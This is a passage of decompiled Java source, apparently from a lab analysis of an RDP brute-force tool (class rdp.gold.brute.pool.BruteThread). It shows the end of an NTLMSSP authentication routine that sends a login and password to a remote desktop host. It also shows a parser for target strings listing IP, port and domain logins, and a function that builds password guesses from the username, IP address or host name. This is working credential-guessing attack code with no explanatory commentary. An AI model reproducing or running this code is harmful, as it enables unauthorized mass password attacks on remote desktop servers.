/*  919 */         throw new Exception("INFO: End of stream or empty buffer is read from stream.");
/*      */       }
/*      */       
/*  922 */       buffer.length = actualLength;
/*  923 */       buffer.rewindCursor();
/*  924 */       buffer.ref();
/*      */       
/*  926 */       CounterPool.useBytes.addAndGet(actualLength);
/*      */       
/*  928 */       ServerNtlmsspChallenge serverNtlmsspChallenge = new ServerNtlmsspChallenge(ntlmState);
/*  929 */       serverNtlmsspChallenge.proccessPacket(buffer);
/*      */       
/*  931 */       this.domainJre = ntlmState.serverNetbiosDomainName;
/*      */       
/*  933 */       ClientNtlmsspPubKeyAuth clientNtlmsspPubKeyAuth = new ClientNtlmsspPubKeyAuth(ntlmState, sslState, host, "", "workstation", login, password);
/*      */       
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*  943 */       buffer = clientNtlmsspPubKeyAuth.proccessPacket(null);
/*  944 */       buffer.rewindCursor();
/*      */       
/*  946 */       sslSocketOutputStream.write(buffer.data, buffer.offset, buffer.length);
/*  947 */       sslSocketOutputStream.flush();
/*      */       
/*  949 */       buffer = new ByteBuffer(-1);
/*  950 */       actualLength = sslSocketInputStream.read(buffer.data, buffer.offset, buffer.data.length - buffer.offset);
/*      */       
/*  952 */       if (actualLength <= 0) {
/*  953 */         throw new Exception("INFO: End of stream or empty buffer is read from stream.");
/*      */       }
/*      */       
/*  956 */       buffer.length = actualLength;
/*  957 */       buffer.rewindCursor();
/*  958 */       buffer.ref();
/*      */       
/*  960 */       CounterPool.useBytes.addAndGet(actualLength);
/*      */       
/*  962 */       ServerNtlmsspPubKeyPlus1 serverNtlmsspPubKeyPlus1 = new ServerNtlmsspPubKeyPlus1(ntlmState);
/*  963 */       serverNtlmsspPubKeyPlus1.proccessPacket(buffer);
/*      */       
/*  965 */       return true;
/*      */     } catch (Exception e) {
/*  967 */       StringWriter sw = new StringWriter();
/*  968 */       e.printStackTrace(new PrintWriter(sw));
/*  969 */       logger.error(e.getMessage() + sw.toString());
/*      */     } finally {
/*      */       try {
/*  972 */         socket.close();
/*      */       } catch (Exception e) {
/*  974 */         logger.error(e);
/*      */       }
/*      */     }
/*      */     
/*  978 */     return false;
/*      */   }
/*      */   
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */   private void parseHost(String host)
/*      */     throws Exception
/*      */   {
/*      */     try
/*      */     {
/* 1312 */       RDPEntity rdpEntity = RDPEntity.parse(host);
/*      */       
/* 1314 */       if ((rdpEntity != null) && (rdpEntity.getLogin() != null) && (rdpEntity.getPassword() != null)) {
/* 1315 */         this.ip = rdpEntity.getIp();
/* 1316 */         this.port = rdpEntity.getPort();
/*      */       } else {
/* 1318 */         this.ip = host.split(":")[0];
/*      */         
/* 1320 */         if (host.contains(">>>")) {
/* 1321 */           this.port = Integer.parseInt(host.split(":")[1].split(">>>")[0]);
/*      */           
/* 1323 */           String[] loginsStr = host.split(">>>")[1].split(";");
/*      */           
/* 1325 */           for (String login : loginsStr) {
/*      */             try {
/* 1327 */               this.loginsDomain.put(login.contains("\\") ? login.split("\\\\")[1] : login, login.contains("\\") ? login.split("\\\\")[0] : "");
/* 1328 */               this.logins.add(login.contains("\\") ? login.split("\\\\")[1] : login);
/*      */             }
/*      */             catch (Exception localException1) {}
/*      */           }
/*      */         } else {
/* 1333 */           this.port = Integer.parseInt(host.split(":")[1]);
/*      */         }
/*      */       }
/*      */     } catch (Exception e) {
/* 1337 */       StringWriter sw = new StringWriter();
/* 1338 */       e.printStackTrace(new PrintWriter(sw));
/* 1339 */       logger.error(e.getMessage() + sw.toString());
/*      */       
/* 1341 */       throw e;
/*      */     }
/*      */   }
/*      */   
/*      */   private String buildPassword(String ip, String login, String password) {
/* 1346 */     if (password.equals("%EmptyPass%")) {
/* 1347 */       password = "";
/* 1348 */     } else if (password.equals("%OriginalUsername%")) {
/* 1349 */       password = password.replace("%OriginalUsername%", login);
/* 1350 */     } else if (password.equals("%username%")) {
/* 1351 */       password = password.replace("%username%", login.toLowerCase());
/* 1352 */     } else if (password.equals("%GetHost%")) {
/*      */       try {
/* 1354 */         java.net.InetAddress inetAddress = java.net.InetAddress.getByName(ip);
/* 1355 */         password = inetAddress.getHostName();
/*      */       }
/*      */       catch (Exception localException) {}
/* 1358 */     } else if (password.equals("%IP%")) {
/* 1359 */       password = ip;
/* 1360 */     } else if (password.equals("%IpReplaceDot%")) {
/* 1361 */       password = ip.replaceAll("\\.", "");
/*      */     }
/*      */     
/* 1364 */     return password;
/*      */   }
/*      */   
/*      */   public static void main(String[] argc) throws Exception {
/* 1368 */     BruteThread bruteThread = new BruteThread();
/*      */   }
/*      */ }


/* Location:              C:\Users\Lab\Desktop\a.jar!\rdp\gold\brute\pool\BruteThread.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       0.7.1
 */